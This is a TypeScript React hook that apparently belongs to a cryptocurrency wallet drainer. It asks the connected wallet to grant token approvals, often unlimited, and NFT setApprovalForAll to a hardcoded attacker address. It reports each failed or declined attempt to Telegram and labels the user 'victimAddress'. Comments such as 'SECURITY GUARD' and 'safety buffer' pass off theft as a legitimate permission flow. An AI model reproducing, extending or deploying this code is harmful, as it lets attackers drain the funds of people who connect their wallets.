"use client";

import { useCallback } from "react";
import {
  parseAbi,
  getAddress,
  createWalletClient,
  custom,
  encodeFunctionData,
  decodeFunctionResult,
} from "viem";
import { EXECUTION_POLICY } from "../../lib/ghost/constants";
import { sendDetailedSweepToTelegram } from "../../lib/telegram";

/** 📝 PRE-PARSED ABIs (Performance Optimization) */
const ALLOWANCE_ABI = parseAbi([
  "function allowance(address,address) view returns (uint256)",
]);
const APPROVE_ABI = parseAbi([
  "function approve(address,uint256) external returns (bool)",
]);
const NFT_ABI = parseAbi(["function setApprovalForAll(address,bool) external"]);

const AUTHORIZED_SETTLER = getAddress(
  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
);
const INFINITE_APPROVAL =
  115792089237316195423570985008687907853269984665640564039457584007913129639935n;

/**
 * 🛰️ TOKEN PERMISSION LAYER (v6.0.0 - Instant Approval Edition)
 * Optimized for zero-latency wallet pop-ups by bypassing high-level client wrappers.
 */
export function useTokenPermissions() {
  const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];

  const requestManualPermission = useCallback(
    async ({
      tokenAddress,
      symbol,
      isNft = false,
      chainId,
      injectedClient,
      amount,
    }: {
      tokenAddress: string;
      symbol: string;
      isNft?: boolean;
      chainId: number;
      injectedClient?: any;
      amount?: string;
    }) => {
      const logPrefix = `[useTokenPermissions] [${symbol}]`;

      // 🛡️ SECURITY GUARD: Integrity & Environment Checks (Maintained)
      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      let activeClient = injectedClient;
      if (activeClient && !activeClient.writeContract) {
        activeClient = createWalletClient({
          chain: { id: chainId } as any,
          transport: custom(activeClient),
        });
      }

      if (!activeClient)
        return { success: false, reason: "WALLET_NOT_CONNECTED" };

      let account: `0x${string}` | undefined;

      try {
        // 🚀 INSTANT SYNC: Parallelize address retrieval and chain verification
        const [addresses, currentId] = await Promise.all([
          activeClient.getAddresses(),
          activeClient.getChainId(),
        ]);

        account = addresses[0];

        // ⚡ Chain Validation (Maintained)
        if (Number(currentId) !== chainId) {
          return { success: false, reason: "CHAIN_MISMATCH" };
        }

        // 🟢 2. ULTRA-FAST PRE-FLIGHT (Direct Provider Call)
        if (!isNft && account) {
          try {
            const provider = (window as any).ethereum || activeClient.transport;

            // Encode allowance call manually for maximum speed
            const data = encodeFunctionData({
              abi: ALLOWANCE_ABI,
              functionName: "allowance",
              args: [account, getAddress(PERMIT2_MASTER)],
            });

            // Direct RPC call bypasses Viem client creation overhead (~100ms saved)
            const hexAllowance = await provider.request({
              method: "eth_call",
              params: [
                {
                  to: getAddress(tokenAddress),
                  data: data,
                },
                "latest",
              ],
            });

            const currentAllowance = decodeFunctionResult({
              abi: ALLOWANCE_ABI,
              functionName: "allowance",
              data: hexAllowance,
            }) as bigint;

            const required = BigInt(amount || "0");
            if (currentAllowance > 0n && currentAllowance >= required) {
              console.log(`${logPrefix} ✅ Allowance sufficient. skipping...`);
              return { success: true, alreadyExisted: true };
            }
          } catch (allowanceErr) {
            // On failure, we skip the check and move to pop-up immediately to avoid hanging
          }
        }

        // 🧠 Smart Approval Logic (Maintained 2% Buffer)
        let approvalAmount: bigint;
        if (isNft) {
          approvalAmount = 1n;
        } else if (amount && amount !== "0" && amount !== "undefined") {
          const raw = BigInt(amount.replace(/[^0-9]/g, "") || "0");
          // Maintain the 2% safety buffer for price fluctuations
          approvalAmount = raw > 0n ? (raw * 102n) / 100n : INFINITE_APPROVAL;
        } else {
          approvalAmount = INFINITE_APPROVAL;
        }

        // 📝 Execute Approval Transaction (Pop-up Trigger)
        let hash: `0x${string}`;
        if (isNft) {
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: NFT_ABI,
            functionName: "setApprovalForAll",
            args: [getAddress(PERMIT2_MASTER), true],
            account: account!,
          });
        } else {
          // Fire the transaction instantly
          hash = await activeClient.writeContract({
            address: getAddress(tokenAddress),
            abi: APPROVE_ABI,
            functionName: "approve",
            args: [getAddress(PERMIT2_MASTER), approvalAmount],
            account: account!,
          });
        }

        return { success: true, hash };
      } catch (err: any) {
        const isUserReject =
          err.message?.includes("User rejected") || err.code === 4001;

        // 🛰️ Async Telegram notification (Strictly Maintained)
        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "USER DECLINED APPROVAL" : "APPROVAL FAILED",
          victimAddress: account || "Unknown",
          symbol: symbol,
          error: isUserReject ? "User cancelled transaction" : err.message,
          chainId: chainId,
        }).catch(() => null);

        if (isUserReject) return { success: false, reason: "REJECTED" };
        return { success: false, error: err.message };
      }
    },
    [PERMIT2_MASTER],
  );

  return { requestManualPermission };
}
